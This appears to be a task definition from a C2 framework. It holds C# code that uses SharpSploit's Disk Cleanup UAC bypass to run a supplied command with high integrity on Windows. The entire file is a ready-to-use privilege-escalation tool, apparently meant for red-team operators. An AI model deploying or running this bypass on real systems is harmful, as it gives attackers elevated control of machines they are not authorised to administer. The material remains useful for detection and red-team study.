  Description: Bypasses UAC Disk Cleanup process. Parameter Command needs to end in REM.
  Help: 
  Language: CSharp
  CompatibleDotNetVersions:
  - Net35
  - Net40
  Code: >-
    using System;

    using System.Text;

    using SharpSploit.Credentials;


    public static class Task

    {
        public static string Execute(string encodedCommand)
        {
            try
            {
                using (Tokens t = new Tokens())
                {
                    if (t.BypassUACDiskCleanup(encodedCommand))
                    {
                        return "Successfully executed command with high integrity.";
                    }
                    else
                    {
                        return "Failed to execute with high integrity.";
                    }
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
